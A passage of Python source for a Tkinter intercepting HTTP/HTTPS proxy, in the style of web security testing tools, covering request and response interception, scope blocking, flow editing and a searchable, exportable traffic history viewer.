                if not self._process(wfile, 'https', host, port, *msg):
                    break
        except Exception:
            pass
        finally:
            try:
                tls.close()
            except Exception:
                pass

    def _blind_tunnel(self, host, port):
        """Relay raw bytes both ways without decrypting (used when TLS MITM is off)."""
        try:
            upstream = socket.create_connection((host, port), timeout=30)
        except Exception:
            try:
                self.wfile.write(b'HTTP/1.1 502 Bad Gateway\r\n\r\n')
            except Exception:
                pass
            return
        self.wfile.write(b'HTTP/1.1 200 Connection established\r\n\r\n')
        self.wfile.flush()
        self.server.controller.note_status(
            f'HTTPS {host} tunneled (no MITM — install cryptography)')

        def pipe(src, dst):
            """Copy bytes from src to dst until either side closes."""
            try:
                while True:
                    data = src.recv(65536)
                    if not data:
                        break
                    dst.sendall(data)
            except Exception:
                pass
            finally:
                for s in (src, dst):
                    try:
                        s.shutdown(socket.SHUT_RDWR)
                    except Exception:
                        pass

        t = threading.Thread(target=pipe, args=(self.connection, upstream),
                             daemon=True)
        t.start()
        pipe(upstream, self.connection)

    # ── plain HTTP proxy loop ──
    def _serve_plain(self, start, headers):
        """Serve the first plain-HTTP request (absolute-form line) then loop for
        keep-alive requests on the same connection."""
        body = b''
        cl = headers.get('Content-Length')
        if cl:
            try:
                body = self.rfile.read(int(cl))
            except (ValueError, OSError):
                body = b''
        pu = urlparse(start.split()[1]) if len(start.split()) >= 2 else None
        host = pu.hostname if pu else ''
        port = pu.port or 80 if pu else 80
        if not self._process(self.wfile, 'http', host, port, start, headers, body):
            return
        try:
            while True:
                msg = _read_http_message(self.rfile)
                if not msg:
                    break
                s2 = msg[0].split()
                p2 = urlparse(s2[1]) if len(s2) >= 2 else None
                h2 = p2.hostname if p2 else host
                pt2 = (p2.port or 80) if p2 else port
                if not self._process(self.wfile, 'http', h2, pt2, *msg):
                    break
        except Exception:
            pass

    def _process(self, wfile, scheme, host, port, start, headers, body) -> bool:
        """Handle one request end-to-end. Returns True to keep the connection
        alive for another request, False to close it."""
        ctrl = self.server.controller
        parts = start.split()
        if len(parts) < 2:
            return False
        method = parts[0].upper()
        target = parts[1]
        # Origin-form (path) over a CONNECT tunnel, or absolute-form for plain HTTP.
        if target.startswith(('http://', 'https://')):
            tp = urlparse(target)
            path = tp.path + (('?' + tp.query) if tp.query else '')
            host = tp.hostname or host
            port = tp.port or port
        else:
            path = target
        if not host:
            host = headers.get('Host', '').split(':')[0]
        flow = ProxyFlow(method, scheme, host, port, path, dict(headers), body)

        # Scope gate — out-of-scope requests are never sent.
        if not ctrl.in_scope(flow.url):
            ctrl.note_status(f'out of scope (blocked): {flow.url[:70]}')
            self._write_simple(wfile, 403, 'Forbidden (out of scope)')
            return True

        # Intercept gate (request).
        if not ctrl.intercept_request(flow):
            self._write_simple(wfile, 502, 'Dropped by user')
            return True

        # Upstream send.
        if not self._send_upstream(flow):
            self._write_simple(wfile, 502, 'Upstream error')
            ctrl.note_node(flow)
            return True

        # Intercept gate (response).
        if not ctrl.intercept_response(flow):
            return False        # dropped → close

        self._write_response(wfile, flow)
        ctrl.note_node(flow)
        # Honour an explicit close request from either side.
        conn = (flow.resp_headers.get('Connection', '') or
                headers.get('Connection', '')).lower()
        return 'close' not in conn

    def _send_upstream(self, flow: ProxyFlow) -> bool:
        """Send the (possibly edited) request upstream with `requests` and capture
        the decompressed response onto the flow. Returns False on failure."""
        if not REQUESTS_AVAILABLE:
            return False
        h = {k: v for k, v in flow.req_headers.items()
             if k.lower() not in _HOP_BY_HOP
             and k.lower() not in ('host', 'content-length')}
        try:
            r = requests.request(
                flow.method, flow.url, headers=h,
                data=flow.req_body or None,
                allow_redirects=False, verify=False, timeout=30)
        except Exception as e:
            flow.status, flow.reason = 502, 'Bad Gateway'
            flow.resp_headers = {'Content-Type': 'text/plain'}
            flow.resp_body = f'[proxy] upstream error: {e}'.encode()
            return True
        flow.status = r.status_code
        flow.reason = r.reason or ''
        flow.resp_body = r.content          # decompressed by requests
        # Drop hop-by-hop + content-encoding/length (body is already decoded;
        # we recompute Content-Length when writing back).
        flow.resp_headers = {
            k: v for k, v in r.headers.items()
            if k.lower() not in _HOP_BY_HOP
            and k.lower() not in ('content-encoding', 'content-length')}
        return True

    @staticmethod
    def _write_simple(wfile, status, msg):
        """Write a tiny text/plain response (used for blocks/drops/errors)."""
        body = msg.encode()
        try:
            wfile.write((f'HTTP/1.1 {status} {msg}\r\n'
                         f'Content-Type: text/plain\r\n'
                         f'Content-Length: {len(body)}\r\n'
                         f'Connection: close\r\n\r\n').encode() + body)
            wfile.flush()
        except Exception:
            pass

    @staticmethod
    def _write_response(wfile, flow: ProxyFlow):
        """Write the flow's response back to the client, recomputing Content-Length."""
        body = flow.resp_body if isinstance(flow.resp_body, bytes) \
            else str(flow.resp_body).encode('utf-8', 'replace')
        lines = [f'HTTP/1.1 {flow.status} {flow.reason}']
        for k, v in flow.resp_headers.items():
            lines.append(f'{k}: {v}')
        lines.append(f'Content-Length: {len(body)}')
        head = ('\r\n'.join(lines) + '\r\n\r\n').encode('iso-8859-1', 'replace')
        try:
            wfile.write(head + body)
            wfile.flush()
        except Exception:
            pass


class InterceptProxy:
    """Controller for the intercepting proxy: owns the listener thread, the
    interception state machine (a queue of paused flows, one shown at a time) and
    the scope gate. The UI (ProxyPanel) drives forward/forward-and-continue/drop
    through this object; handler threads block on each flow's Event until resolved.

    Callbacks (set by the app):
      on_show(flow)   — display the currently-paused flow in the panel (or None)
      on_node(flow)   — record a completed transaction as a SiteNode
      on_status(msg)  — status-bar line
      ui_call(fn)     — marshal fn onto the Tk main thread
    """

    def __init__(self, port=8080, on_show=None, on_node=None, on_status=None,
                 ui_call=None):
        """Create the controller (not yet listening). `ui_call` marshals callbacks
        onto the Tk thread; the others are the panel/app hooks."""
        self.port = int(port)
        self.ca = ProxyCA()
        self.intercept = False
        self.scope_re = None
        self._server = None
        self._thread = None
        self._lock = threading.Lock()
        self._pending: deque[ProxyFlow] = deque()
        self._current: ProxyFlow | None = None
        self.on_show = on_show
        self.on_node = on_node
        self.on_status = on_status
        self.ui_call = ui_call or (lambda fn: fn())

    # ── lifecycle ──
    def running(self) -> bool:
        """True while the listener is bound and serving."""
        return self._server is not None

    def start(self) -> bool:
        """Start the listener on 127.0.0.1:port (idempotent). Returns success."""
        if self._server is not None:
            return True
        try:
            self._server = _ProxyServer(('127.0.0.1', self.port), self)
        except OSError as e:
            self.note_status(f'proxy bind failed on :{self.port} — {e}')
            self._server = None
            return False
        self._thread = threading.Thread(
            target=self._server.serve_forever, daemon=True)
        self._thread.start()
        self.note_status(f'proxy listening on 127.0.0.1:{self.port}'
                         + ('' if self.ca.available()
                            else ' (HTTPS blind-tunnel — no cryptography)'))
        return True

    def stop(self):
        """Shut the listener down and release any paused flows."""
        self.set_intercept(False)
        srv, self._server = self._server, None
        if srv is not None:
            try:
                srv.shutdown()
                srv.server_close()
            except Exception:
                pass
        self.note_status('proxy stopped')

    def set_port(self, port):
        """Change the listen port, restarting the listener if it was running."""
        port = int(port)
        if port == self.port:
            return
        was = self.running()
        if was:
            self.stop()
        self.port = port
        if was:
            self.start()

    # ── scope ──
    def set_scope(self, text):
        """Recompile the scope pattern shared with the crawler (empty = no limit)."""
        self.scope_re = _compile_scope_pattern(text)

    def in_scope(self, url) -> bool:
        """Whether `url` (or its host) matches the scope; True when no scope set."""
        if self.scope_re is None:
            return True
        try:
            if self.scope_re.match(url):
                return True
            host = urlparse(url).netloc
            return bool(self.scope_re.match(host)
                        or self.scope_re.match('https://' + host)
                        or self.scope_re.match('https://' + host + '/'))
        except Exception:
            return True

    # ── interception state machine (called from handler threads) ──
    def intercept_request(self, flow: ProxyFlow) -> bool:
        """Block the handler until the user forwards the request (True) or drops it
        (False). Returns immediately (True) when intercept is off."""
        return self._gate(flow, 'request')

    def intercept_response(self, flow: ProxyFlow) -> bool:
        """Block the handler until the user forwards the response (True) or drops it
        (False). Skipped when intercept is off or 'forward & continue' was chosen."""
        if flow.skip_response:
            return True
        return self._gate(flow, 'response')

    def _gate(self, flow: ProxyFlow, phase: str) -> bool:
        """Shared request/response gate: enqueue the flow, show it if it's at the
        front, then block on its Event. Returns False if the user dropped it."""
        with self._lock:
            if not self.intercept:
                return True
            flow.phase = phase
            flow.dropped = False
            flow.event.clear()
            self._pending.append(flow)
            if self._current is None:
                self._current = flow
                self._show(flow)
            else:
                self.note_status(
                    f'intercept queue: {len(self._pending)} waiting')
        flow.event.wait()
        return not flow.dropped

    def _show(self, flow):
        """Marshal the panel display of `flow` (or the empty state) onto the UI."""
        if self.on_show:
            self.ui_call(lambda: self.on_show(flow))

    def _advance(self):
        """Promote the next pending flow to current and show it (or clear)."""
        self._current = self._pending[0] if self._pending else None
        self._show(self._current)

    # ── resolution (called from the UI thread via ProxyPanel) ──
    def resolve(self, action, raw_head=None, raw_body=None):
        """Resolve the currently-shown flow. `action` is 'forward',
        'forward_continue' or 'drop'. The raw editor text (head+body) is parsed
        back into the flow before it is released."""
        with self._lock:
            flow = self._current
            if flow is None:
                return
            if action == 'drop':
                flow.dropped = True
            else:
                self._apply_edits(flow, raw_head, raw_body)
                if action == 'forward_continue' and flow.phase == 'request':
                    flow.skip_response = True
            try:
                self._pending.remove(flow)
            except ValueError:
                pass
            self._advance()
        flow.event.set()

    @staticmethod
    def _apply_edits(flow: ProxyFlow, raw_head, raw_body):
        """Parse edited editor text back onto the flow for the active phase. A
        blank edit leaves the captured bytes untouched."""
        if raw_head is None:
            return
        raw = combine_req_body(raw_head, raw_body or '')
        if flow.phase == 'request':
            parsed = parse_raw_request(raw, flow.url)
            if parsed:
                method, url, headers, body = parsed
                pu = urlparse(url)
                flow.method = method
                flow.host = pu.hostname or flow.host
                flow.port = pu.port or flow.port
                flow.path = pu.path + (('?' + pu.query) if pu.query else '')
                flow.scheme = pu.scheme or flow.scheme
                flow.req_headers = headers
                flow.req_body = body.encode('utf-8', 'replace') if body else b''
        else:
            parsed = parse_raw_response(raw)
            if parsed:
                status, reason, headers, body = parsed
                flow.status = status
                flow.reason = reason
                flow.resp_headers = headers
                flow.resp_body = body.encode('utf-8', 'replace')

    def set_intercept(self, on: bool):
        """Toggle interception. Turning it OFF releases every paused flow (forwarded
        unchanged) and clears the panel."""
        on = bool(on)
        released = []
        with self._lock:
            self.intercept = on
            if not on:
                released = list(self._pending)
                self._pending.clear()
                self._current = None
        for flow in released:
            flow.event.set()
        if not on:
            self._show(None)
        self.note_status('intercept ON' if on else 'intercept OFF')

    # ── callbacks ──
    def note_status(self, msg):
        """Emit a status-bar line on the UI thread."""
        if self.on_status:
            self.ui_call(lambda: self.on_status(msg))

    def note_node(self, flow: ProxyFlow):
        """Record a completed transaction as a SiteNode on the UI thread."""
        if self.on_node:
            self.ui_call(lambda: self.on_node(flow))


class ProxyHistoryDialog(tk.Toplevel):
    """A non-modal history viewer for the intercepting proxy: every transaction
    the proxy has relayed, listed on the left, with the selected one's request /
    response split across four read-only boxes on the right (request headers over
    request body on the left column, response headers over response body on the
    right).

    A top bar carries a Scope filter (a glob like '*.example.com' that restricts
    which transactions are listed) and a Search box with ◀ / ▶ steppers that walks
    the matches *within the in-scope rows*. The list columns (#, Method, Code, URL,
    Req size, Resp size) sort on a header click, cycling none → ascending →
    descending → none. Buttons clear the selected row, clear all history, or export
    the whole history as JSON. Stays open while the proxy keeps capturing — the
    panel pushes new rows in live via `add_row`."""

    # Column id → (heading title, width, numeric?, stretch?). Widths are sized to
    # fit the title plus the sort arrow (' ▲' / ' ▼') the heading grows by when
    # the column is ordered, so the label never clips.
    _COLS = (('id', '#', 54, True, False),
             ('method', 'Method', 90, False, False),
             ('status', 'Code', 70, True, False),
             ('req_size', 'Req. Size', 100, True, False),
             ('resp_size', 'Resp. Size', 104, True, False),
             ('url', 'URL', 300, False, True))

    def __init__(self, parent, panel):
        """Build the viewer over `panel`'s history list and populate it."""
        super().__init__(parent, bg=C['bg'])
        self.panel = panel
        self.title('Proxy History')
        self.configure(bg=C['bg'])
        self.geometry('1080x600')
        self._sort_col = None           # column id currently sorted, or None
        self._sort_dir = 0              # 1 ascending, -1 descending, 0 none
        self._visible_ids = []          # ids shown, in display order
        self._search_matches = []       # ids matching the search, in order
        self._search_idx = -1
        self._search_query = ''
        self._build()
        self._rebuild_list()
        # Drop the panel's reference when closed so live updates stop.
        self.protocol('WM_DELETE_WINDOW', self._on_close)

    def _build(self):
        """The top search bar, the list ▸ four-box split, action buttons. The list
        is scoped by the main window's scope field (no separate scope box here)."""
        # ── top: search with steppers (steppers first, at equal natural size) ──
        top = tk.Frame(self, bg=C['bg'])
        top.pack(fill='x', padx=6, pady=(6, 0))
        tk.Label(top, text='Search:', bg=C['bg'],
                 font=C['font']).pack(side='left', padx=(0, 2))
        Btn(top, text='▶', padx=4,
            command=self._search_next).pack(side='right', padx=(1, 0))
        Btn(top, text='◀', padx=4,
            command=self._search_prev).pack(side='right', padx=(6, 1))
        self._search_var = tk.StringVar(value='')
        se = tk.Entry(top, textvariable=self._search_var, font=C['font'],
                      relief='sunken', bd=2, bg=C['window'], highlightthickness=0)
        se.bind('<KeyRelease>', self._on_search)
        se.pack(side='left', fill='x', expand=True, padx=(2, 0))
        self._search_ent = se

        body = tk.Frame(self, bg=C['bg'])
        body.pack(fill='both', expand=True, padx=6, pady=4)

        # ── left: the traffic list ──
        left = tk.Frame(body, bg=C['bg'])
        left.pack(side='left', fill='both', expand=False)
        tk.Label(left, text='Intercepted traffic', bg=C['bg'],
                 font=C['font_b']).pack(anchor='w')
        lwrap = tk.Frame(left, bg=C['bg'])
        lwrap.pack(fill='both', expand=True, pady=(2, 0))
        cols = tuple(c[0] for c in self._COLS)
        self.tree = ttk.Treeview(lwrap, columns=cols, show='headings',
                                 selectmode='browse', height=20)
        for cid, txt, w, _num, stretch in self._COLS:
            self.tree.heading(cid, text=txt,
                              command=lambda c=cid: self._on_sort(c))
            # minwidth = width keeps fixed columns from shrinking below the
            # heading (title + arrow); URL keeps a sensible floor while it grows.
            self.tree.column(cid, width=w, anchor='w', stretch=stretch,
                             minwidth=(120 if stretch else w))
        sb = tk.Scrollbar(lwrap, orient='vertical', command=self.tree.yview)
        self.tree.config(yscrollcommand=sb.set)
        self.tree.pack(side='left', fill='both', expand=True)
        sb.pack(side='right', fill='y')
        self.tree.bind('<<TreeviewSelect>>', self._on_select)
        self.tree.bind('<Button-3>', self._on_right_click)
        self._ctx_menu = None

        # ── right: the four read-only boxes (headers over bodies) ──
        right = tk.Frame(body, bg=C['bg'])
        right.pack(side='left', fill='both', expand=True, padx=(6, 0))

        def cell(row, col, label):
            """A labelled read-only box at (row, col) of the 2×2 grid."""
            cf = tk.Frame(right, bg=C['bg'])
            cf.grid(row=row, column=col, sticky='nsew',
                    padx=(0, 3) if col == 0 else (3, 0),
                    pady=(0, 3) if row == 0 else (3, 0))
            cf.rowconfigure(1, weight=1)
            cf.columnconfigure(0, weight=1)
            tk.Label(cf, text=label, bg=C['bg'],
                     font=C['font_b']).grid(row=0, column=0, sticky='w')
            wrap = tk.Frame(cf, bg=C['bg'])
            wrap.grid(row=1, column=0, sticky='nsew', pady=(2, 0))
            txt = Text95(wrap, height=8, width=40)
            s = tk.Scrollbar(wrap, orient='vertical', command=txt.yview)
            txt.config(yscrollcommand=s.set)
            txt.pack(side='left', fill='both', expand=True)
            s.pack(side='right', fill='y')
            return txt

        right.rowconfigure(0, weight=1, uniform='hb')
        right.rowconfigure(1, weight=1, uniform='hb')
        right.columnconfigure(0, weight=1, uniform='rr')
        right.columnconfigure(1, weight=1, uniform='rr')
        self.req_head_txt = cell(0, 0, 'Request Headers')
        self.req_body_txt = cell(1, 0, 'Request Body')
        self.resp_head_txt = cell(0, 1, 'Response Headers')
        self.resp_body_txt = cell(1, 1, 'Response Body')

        # ── bottom: actions (clear/export on the left; repeater + save node on
        # the bottom-right, Send to Repeater immediately left of Save as Node) ──
        btns = tk.Frame(self, bg=C['bg'])
        btns.pack(fill='x', padx=6, pady=(0, 6))
        Btn(btns, text=' Clear Selected ',
            command=self._clear_selected).pack(side='left', padx=(0, 4))
        Btn(btns, text=' Clear All History ',
            command=self._clear_all).pack(side='left', padx=4)
        Btn(btns, text=' Export as JSON ',
            command=self._export_json).pack(side='left', padx=4)
        Btn(btns, text=' Save as Node ',
            command=self._save_selected_node).pack(side='right', padx=(4, 0))
        Btn(btns, text=' Send to Repeater ',
            command=self._repeat_selected).pack(side='right', padx=4)

    # ── scope / sort / list maintenance ──
    def _in_scope(self, url):
        """Whether `url` passes the main window's scope (shared via the proxy
        controller). True when there is no controller or no scope set."""
        ctrl = getattr(self.panel, 'controller', None)
        if ctrl is None:
            return True
        try:
            return ctrl.in_scope(url)
        except Exception:
            return True

    def _scoped_records(self):
        """The history records that pass the main window's scope (history order)."""
        return [r for r in self.panel.history if self._in_scope(r['url'])]

    def _sorted_records(self):
        """Scoped records with the current column sort applied (none = history
        order)."""
        recs = self._scoped_records()
        if not self._sort_col or self._sort_dir == 0:
            return recs
        numeric = next((c[3] for c in self._COLS if c[0] == self._sort_col),
                       False)
        col = self._sort_col

        def key(r):
            v = r.get(col)
            if numeric:
                try:
                    return (0, float(v))
                except (TypeError, ValueError):
                    return (1, 0.0)        # missing/None sorts last
            return (0, str(v or '').lower())
        return sorted(recs, key=key, reverse=(self._sort_dir < 0))

    def _rebuild_list(self):
        """Repopulate the tree from scope + sort, refresh headings + search."""
        self.tree.delete(*self.tree.get_children())
        self._visible_ids = []
        for rec in self._sorted_records():
            self._insert(rec)
            self._visible_ids.append(str(rec['id']))
        self._refresh_headings()
        self._refresh_search(step=False)

    def _refresh_headings(self):
        """Repaint the heading titles with the active sort arrow (▲ / ▼)."""
        for cid, txt, _w, _num, _stretch in self._COLS:
            arrow = ''
            if cid == self._sort_col and self._sort_dir:
                arrow = ' ▲' if self._sort_dir > 0 else ' ▼'
            self.tree.heading(cid, text=txt + arrow)

    def _on_sort(self, col):
        """Cycle this column's sort: none → ascending → descending → none."""
        if col == self._sort_col:
            self._sort_dir = {0: 1, 1: -1, -1: 0}[self._sort_dir]
            if self._sort_dir == 0:
                self._sort_col = None
        else:
            self._sort_col = col
            self._sort_dir = 1
        self._rebuild_list()

    def _insert(self, rec):
        """Append one history record as a tree row (iid = the record's id)."""
        self.tree.insert('', 'end', iid=str(rec['id']),
                         values=(rec['id'], rec['method'],
                                 rec.get('status') or '',
                                 rec.get('req_size', 0),
                                 rec.get('resp_size', 0),
                                 rec['url'][:300]))

    def add_row(self, _rec):
        """Live hook: the panel just recorded a new flow — re-apply scope/sort so
        the new row lands in the right place (and only if it is in scope)."""
        try:
            self._rebuild_list()
        except tk.TclError:
            pass

    def _on_select(self, _evt=None):
        """Show the request/response of the selected row in the four boxes."""
        rec = self._selected_record()
        self._show(rec)

    def _selected_record(self):
        """The history record for the selected row, or None."""
        sel = self.tree.selection()
        if not sel:
            return None
        return next((r for r in self.panel.history
                     if str(r['id']) == sel[0]), None)

    @staticmethod
    def _node_from_record(rec):
        """Build a SiteNode from a history record (same builder the panel uses)."""
        return ProxyPanel.build_node(
            rec['method'], rec['url'], rec.get('req_headers', {}),
            rec.get('req_body', ''), rec.get('status'), rec.get('reason', ''),
            rec.get('resp_headers', {}), rec.get('resp_body', ''))

    def _save_selected_node(self):
        """Save the selected transaction to the graph as a node."""
        rec = self._selected_record()
        if rec is None or not self.panel.on_save_node:
            return
        self.panel.on_save_node(self._node_from_record(rec))

    def _repeat_selected(self):
        """Open the Repeater seeded with the selected transaction."""
        rec = self._selected_record()
        if rec is None or not self.panel.on_repeat_node:
            return
        self.panel.on_repeat_node(self._node_from_record(rec))

    # ── right-click context menu (mirrors the Site Structure tree) ──
    def _on_right_click(self, ev):
        """Post a context menu. Over a row: the per-row actions. Over the empty
        area inside the list (no row): only the list-wide actions (Clear All
        History + Export as JSON). The menu auto-closes when the cursor leaves it
        (a short timer, cancelled on re-entry) — same as the Site Structure tree."""
        m = tk.Menu(self, tearoff=0, bg=C['btn'], fg=C['black'],
                    activebackground=C['sel_bg'], activeforeground=C['sel_fg'],
                    font=C['font'])
        iid = self.tree.identify_row(ev.y)
        if iid:
            self.tree.selection_set(iid)
            self._on_select()
            m.add_command(label='Send to Repeater', command=self._repeat_selected)
            m.add_command(label='Save as Node', command=self._save_selected_node)
            m.add_separator()
            m.add_command(label='Clear Selected', command=self._clear_selected)
            m.add_command(label='Clear All History', command=self._clear_all)
            m.add_command(label='Export as JSON', command=self._export_json)
        else:
            m.add_command(label='Clear All History', command=self._clear_all)
            m.add_command(label='Export as JSON', command=self._export_json)
        m.bind('<Enter>', lambda _e: self._cancel_menu_dismiss(), add='+')
        m.bind('<Leave>', lambda _e: self._schedule_menu_dismiss(), add='+')
        self._ctx_menu = m
        try:
            m.tk_popup(ev.x_root, ev.y_root)
        finally:
            m.grab_release()

    def _schedule_menu_dismiss(self):
        """Arm the deferred close of the open context menu (cursor left it)."""
        self._cancel_menu_dismiss()
        if self._ctx_menu is None:
            return
        self._menu_dismiss_after = self.after(140, self._do_ctx_dismiss)

    def _cancel_menu_dismiss(self):
        """Cancel a pending context-menu dismiss (cursor re-entered the menu)."""
        if getattr(self, '_menu_dismiss_after', None) is not None:
            try:
                self.after_cancel(self._menu_dismiss_after)
            except Exception:
                pass
            self._menu_dismiss_after = None

    def _do_ctx_dismiss(self):
        """Close the context menu — the timer fired without re-entry."""
        self._menu_dismiss_after = None
        m, self._ctx_menu = self._ctx_menu, None
        if m is None:
            return
        try:
            m.unpost()
        except tk.TclError:
            pass
        try:
            m.grab_release()
        except tk.TclError:
            pass

    # ── search ──
    def _build_search_matches(self, query):
        """Ids of the in-scope (visible) rows whose #/method/code/URL contain
        `query` (case-insensitive). Empty query → no matches."""
        q = (query or '').strip().lower()
        if not q:
            return []
        by_id = {str(r['id']): r for r in self.panel.history}
        out = []
        for rid in self._visible_ids:
            r = by_id.get(rid)
            if not r:
                continue
            hay = ' '.join(str(x) for x in (
                r['id'], r['method'], r.get('status') or '', r['url'])).lower()
            if q in hay:
                out.append(rid)
        return out

    def _on_search(self, *_):
        """Recompute matches for the current query and jump to the first."""
        self._refresh_search(step=True)

    def _refresh_search(self, step):
        """Rebuild the match set against the visible rows; optionally step to the
        first match. Tints the search box pink when a non-empty query misses."""
        query = self._search_var.get()
        self._search_query = query
        self._search_matches = self._build_search_matches(query)
        self._search_idx = -1
        try:
            self._search_ent.config(
                bg=(C['window'] if (self._search_matches or not query.strip())
                    else '#ffd6d6'))
        except tk.TclError:
            pass
        if step and self._search_matches:
            self._search_step(0)

    def _search_step(self, delta):
        """Move the search cursor by `delta` (wrapping) and select+reveal it."""
        if not self._search_matches:
            return
        n = len(self._search_matches)
        self._search_idx = (self._search_idx + delta) % n \
            if self._search_idx >= 0 else 0
        rid = self._search_matches[self._search_idx]
        try:
            self.tree.selection_set(rid)
            self.tree.focus(rid)
            self.tree.see(rid)
        except tk.TclError:
            pass

    def _search_next(self, *_):
        """▶ — select the next match (wraps to the first)."""
        self._search_step(1)

    def _search_prev(self, *_):
        """◀ — select the previous match (wraps to the last)."""
        self._search_step(-1)

    def _show(self, rec):
        """Paint (or clear) the four boxes for history record `rec`."""
        self.req_head_txt.set_content(rec['req_head'] if rec else '')
        self.req_body_txt.set_content(rec['req_body'] if rec else '')
        self.resp_head_txt.set_content(rec['resp_head'] if rec else '')
        self.resp_body_txt.set_content(rec['resp_body'] if rec else '')

    # ── actions ──
    def _clear_selected(self):
        """Drop the selected transaction from the history and the list."""
        sel = self.tree.selection()
        if not sel:
            return
        rid = sel[0]
        self.panel.history[:] = [r for r in self.panel.history
                                 if str(r['id']) != rid]
        self._rebuild_list()
        self._show(None)

    def _clear_all(self):
        """Wipe the entire proxy history (after confirmation)."""
        if not self.panel.history:
            return
        if not messagebox.askyesno(
                'Clear All History',
                'Delete all intercepted traffic from the history?',
                parent=self):
            return
        self.panel.history.clear()
        self._rebuild_list()
        self._show(None)

    def _export_json(self):
        """Write the whole history to a JSON file chosen by the user."""
        if not self.panel.history:
            messagebox.showinfo('Export History', 'History is empty.',
                                parent=self)
            return
        fn = filedialog.asksaveasfilename(
            parent=self, title='Export proxy history',
            defaultextension='.json',
            filetypes=[('JSON', '*.json'), ('All files', '*.*')])
        if not fn:
            return
        try:
            with open(fn, 'w', encoding='utf-8') as fh:
                json.dump(self.panel.history, fh, indent=2, ensure_ascii=False)
            messagebox.showinfo(
                'Export History',
                f'Exported {len(self.panel.history)} transactions.',
                parent=self)
        except Exception as e:
            messagebox.showerror('Export History', f'Export failed:\n{e}',
                                 parent=self)

    def _on_close(self):
        """Detach from the panel (stop live updates) and close."""
        if getattr(self.panel, '_history_win', None) is self:
            self.panel._history_win = None
        self.destroy()


class ProxyPanel(tk.Frame):
    """The intercepting-proxy panel (repeater-style). An intercept toolbar over
    four editable boxes (request line+headers / request body / response
    line+headers / response body). When a flow is trapped it is shown here;
    Forward / Forward-and-continue / Drop drive the InterceptProxy controller, and
    the editor text is parsed back into the flow before it is released — so both
    the request sent and the response delivered can be edited. The Intercept
    button toggles trapping; Open Browser launches the system browser through the
    proxy."""

    def __init__(self, parent, controller=None, on_open_browser=None,
                 on_save_node=None, on_repeat_node=None, **kw):
        """Build the panel; `controller` is the InterceptProxy (may be set later
        via set_controller), `on_open_browser` opens the system browser,
        `on_save_node(node)` adds a SiteNode to the graph, and
        `on_repeat_node(node)` opens the Repeater seeded with one."""
        super().__init__(parent, bg=C['bg'], relief='ridge', bd=2, **kw)
        self.controller = controller
        self.on_open_browser = on_open_browser
        self.on_save_node = on_save_node
        self.on_repeat_node = on_repeat_node
        self._current = None            # the ProxyFlow being shown, or None
        self.encode_var = tk.BooleanVar(value=False)
        self.history = []               # every relayed transaction (records)
        self._history_win = None        # the open ProxyHistoryDialog, if any
        self._build()

    def set_controller(self, controller):
        """Attach the InterceptProxy controller and sync the toolbar state."""
        self.controller = controller
        self._refresh_intercept_btn()
        self._update_buttons()

    def _build(self):
        """Build the title bar, intercept toolbar, status line and the 4 boxes."""
        _titlebar(self, 'Proxy').pack(fill='x')
        bar = tk.Frame(self, bg=C['bg'])
        bar.pack(fill='x', padx=4, pady=3)
        # Fixed width (sized to the longer 'OFF' text) so toggling doesn't resize
        # the button and shift the row.
        self.intercept_btn = Btn(bar, text='Intercept: OFF', width=14,
                                 command=self._toggle_intercept,
                                 bg='#b71c1c', fg='white')
        self.intercept_btn.pack(side='left', padx=(0, 6))
        # ▶ forward one step. Grey button, black icon; greyed/blocked when the
        # proxy isn't running.
        self.fwd_btn = Btn(bar, text=' ▶ ', command=self._forward,
                           bg=C['btn'], fg=C['black'], state='disabled')
        self.fwd_btn.pack(side='left', padx=2)
        # Drop keeps its red colour even when blocked (only its state changes).
        self.drop_btn = Btn(bar, text=' ✕ ', command=self._drop,
                            bg='#b71c1c', fg='white', state='disabled')
        self.drop_btn.pack(side='left', padx=2)
        self.open_btn = Btn(bar, text=' Open Browser ', command=self._open_browser)
        self.open_btn.pack(side='left', padx=(10, 2))
        self.history_btn = Btn(bar, text=' History ', command=self._open_history)
        self.history_btn.pack(side='left', padx=2)
        # Top-right: save the displayed transaction as a graph node. Only usable
        # once the request has been sent and its response caught (response phase).
        self.save_node_btn = Btn(bar, text=' Save as Node ',
                                 command=self._save_as_node, state='disabled')
        self.save_node_btn.pack(side='right', padx=2)

        cont, self.req_txt, self.body_txt, self.resp_txt, self.resp_body_txt = \
            _build_req_resp_fixed(self, req_label='Request Header',
                                  body_label='Request Body',
                                  resp_label='Response Header',
                                  resp_body_label='Response Body',
                                  req_editable=True, resp_editable=True)
        # Bottom bar (URL-encode typing pinned to the bottom-right), packed before
        # the editor so it stays anchored to the bottom edge.
        botbar = tk.Frame(self, bg=C['bg'])
        botbar.pack(side='bottom', fill='x', padx=6, pady=(0, 4))
        tk.Checkbutton(botbar, text='URL-encode typing', variable=self.encode_var,
                       bg=C['bg'], activebackground=C['bg'], selectcolor=C['window'],
                       highlightthickness=0, font=C['font']).pack(side='right')
        cont.pack(fill='both', expand=True, padx=6, pady=(2, 4))
        _bind_urlencode(self.req_txt, self.encode_var.get)
        _bind_urlencode(self.body_txt, self.encode_var.get)
        self._show_empty()

    # ── status / intercept toggle ──
    def set_status(self, msg):
        """No-op: the panel has no status line (proxy status shows in the app's
        status bar). Kept so existing callers stay valid."""
        return

    def _toggle_intercept(self):
        """Flip interception on/off via the controller and re-sync the toolbar."""
        if not self.controller:
            return
        self.controller.set_intercept(not self.controller.intercept)
        self._refresh_intercept_btn()
        self._update_buttons()

    def _refresh_intercept_btn(self):
        """Repaint the Intercept button: green ON, red OFF (fixed width)."""
        on = bool(self.controller and self.controller.intercept)
        self.intercept_btn.config(
            text=('Intercept: ON' if on else 'Intercept: OFF'),
            bg=('#2e7d32' if on else '#b71c1c'), fg='white')

    # ── flow display ──
    def _show_empty(self):
        """Clear the editor (no flow trapped)."""
        self._current = None
        self.req_txt.set_content('(no intercepted request)')
        self.body_txt.set_content('')
        _set_split(self.resp_txt, self.resp_body_txt, '')
        self._update_buttons()

    def show_item(self, flow):
        """Display a trapped flow (request or response phase), or clear when None.
        Called on the UI thread by the controller."""
        self._current = flow
        self._refresh_intercept_btn()
        if flow is None:
            self._show_empty()
            return
        _set_split(self.req_txt, self.body_txt, flow.raw_request())
        if flow.phase == 'request':
            _set_split(self.resp_txt, self.resp_body_txt, '(awaiting response)')
            self.set_status(f'intercepted REQUEST: {flow.method} {flow.url[:80]}')
        else:
            _set_split(self.resp_txt, self.resp_body_txt, flow.raw_response())
            self.set_status(f'intercepted RESPONSE: {flow.status} {flow.url[:80]}')
        self._update_buttons()

    def _update_buttons(self):
        """Enable/disable the toolbar buttons by intercept state. With intercept
        OFF everything here is greyed/blocked (the drop button stays red, only its
